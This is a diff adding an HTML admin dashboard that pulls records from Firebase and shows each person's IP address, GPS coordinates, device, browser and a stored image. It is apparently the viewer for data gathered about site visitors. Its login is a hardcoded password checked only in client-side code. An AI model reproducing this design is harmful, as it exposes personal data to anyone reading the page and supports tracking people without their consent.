@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+
+    <!-- Google Fonts for modern typography -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f7f7f7;
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+
+        /* Main container */
+        .container {
+            width: 100%;
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 20px;
+        }
+
+        /* Header */
+        header {
+            background-color: #1e2a3a;
+            color: #fff;
+            text-align: center;
+            padding: 20px 0;
+            border-radius: 8px;
+            margin-bottom: 30px;
+        }
+
+        header h1 {
+            font-size: 2.5em;
+            margin: 0;
+        }
+
+        /* Form styles */
+        .login-form, .user-data {
+            background-color: #fff;
+            padding: 20px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            margin-bottom: 30px;
+            transition: all 0.3s ease;
+        }
+
+        .login-form h2, .user-data h2 {
+            color: #1e2a3a;
+            margin-bottom: 20px;
+        }
+
+        .login-form input, .login-form button, .user-data button {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1.2em;
+        }
+
+        .login-form button, .user-data button {
+            background-color: #1e2a3a;
+            color: white;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .login-form button:hover, .user-data button:hover {
+            background-color: #283644;
+        }
+
+        /* Table Styles */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        table th, table td {
+            padding: 15px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+
+        table th {
+            background-color: #1e2a3a;
+            color: #fff;
+        }
+
+        table tr:hover {
+            background-color: #f1f1f1;
+        }
+
+        .image-cell img {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin: 0 auto;
+        }
+
+        .table-container {
+            overflow-x: auto;
+        }
+
+        .delete-btn {
+            background-color: #e74c3c;
+            color: white;
+            padding: 8px 12px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .delete-btn:hover {
+            background-color: #c0392b;
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+
+            table th, table td {
+                font-size: 1em;
+            }
+
+            .login-form input, .login-form button, .user-data button {
+                font-size: 1.1em;
+            }
+
+            .image-cell img {
+                width: 50px;
+                height: 50px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <header>
+            <h1>Admin Dashboard</h1>
+        </header>
+
+        <!-- Admin Login Form -->
+        <div id="adminLogin" class="login-form">
+            <h2>Login as Admin</h2>
+            <input type="password" id="adminPassword" placeholder="Enter Admin Password">
+            <button onclick="loginAsAdmin()">Login</button>
+        </div>
+
+        <!-- User Data Display -->
+        <div id="userData" class="user-data" style="display: none;">
+            <h2>User Details</h2>
+            <div class="table-container">
+                <table id="userDetailsTable">
+                    <thead>
+                        <tr>
+                            <th>IP Address</th>
+                            <th>Location</th>
+                            <th>Device Model</th>
+                            <th>OS Type</th>
+                            <th>Browser Info</th>
+                            <th>Timestamp</th>
+                            <th>Image</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody></tbody>
+                </table>
+            </div>
+            <button onclick="logout()">Logout</button>
+        </div>
+    </div>
+
+    <script type="module">
+        // Firebase SDK
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.0.2/firebase-app.js';
+        import { getFirestore, collection, getDocs, deleteDoc, doc } from 'https://www.gstatic.com/firebasejs/9.0.2/firebase-firestore.js';
+
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCVnCCy2tFBgxB52NWKrOYFWTwFnClUT4w",
+            authDomain: "sidexp-c5abe.firebaseapp.com",
+            projectId: "sidexp-c5abe",
+            storageBucket: "sidexp-c5abe.appspot.com",
+            messagingSenderId: "1008048850973",
+            appId: "1:1008048850973:web:e61765f89e8d67bb3b5ef4",
+            measurementId: "G-JLWFP4E4Y4"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // Admin Password (Hardcoded for simplicity)
+        const adminPassword = "admin123"; // Replace with a real password or integrate Firebase Auth
+
+        // Admin login function
+        window.loginAsAdmin = function() {
+            const password = document.getElementById("adminPassword").value;
+
+            if (password === adminPassword) {
+                document.getElementById("adminLogin").style.display = "none";
+                document.getElementById("userData").style.display = "block";
+                fetchUserData();
+            } else {
+                alert("Incorrect password!");
+            }
+        }
+
+        // Fetch User Data from Firestore
+        async function fetchUserData() {
+            const querySnapshot = await getDocs(collection(db, "user_info"));
+            const tableBody = document.getElementById("userDetailsTable").getElementsByTagName("tbody")[0];
+
+            querySnapshot.forEach((doc) => {
+                const userData = doc.data();
+                const docId = doc.id; // Document ID
+
+                const row = tableBody.insertRow();
+                row.insertCell(0).textContent = userData.ipAddress || "N/A";
+                row.insertCell(1).textContent = `${userData.locationLatitude || "N/A"}, ${userData.locationLongitude || "N/A"}`;
+                row.insertCell(2).textContent = userData.deviceModel || "Unknown";
+                row.insertCell(3).textContent = userData.osType || "N/A";
+                row.insertCell(4).textContent = userData.browserInfo || "N/A";
+                row.insertCell(5).textContent = userData.timestamp || "N/A";
+
+                const imgCell = row.insertCell(6);
+                if (userData.imageBase64) {
+                    const img = document.createElement("img");
+                    img.src = userData.imageBase64; // Assuming image is stored as base64
+                    img.alt = "User Image";
+                    img.classList.add("image-cell");
+                    imgCell.appendChild(img);
+                } else {
+                    imgCell.textContent = "No image available";
+                }
+
+                // Add delete button
+                const deleteCell = row.insertCell(7);
+                const deleteBtn = document.createElement("button");
+                deleteBtn.textContent = "Delete";
+                deleteBtn.classList.add("delete-btn");
+                deleteBtn.onclick = () => deleteUserData(docId, row);
+                deleteCell.appendChild(deleteBtn);
+            });
+        }
+
+        // Delete User Data from Firestore
+        async function deleteUserData(docId, row) {
+            try {
+                await deleteDoc(doc(db, "user_info", docId)); // Delete from Firestore
+                row.remove(); // Remove the row from the table
+                alert("User data deleted successfully!");
+            } catch (error) {
+                console.error("Error deleting document: ", error);
+                alert("Failed to delete user data.");
+            }
+        }
+
+        // Logout function
+        window.logout = function() {
+            document.getElementById("adminLogin").style.display = "block";
+            document.getElementById("userData").style.display = "none";
+        }
+    </script>
+
+</body>
+</html>
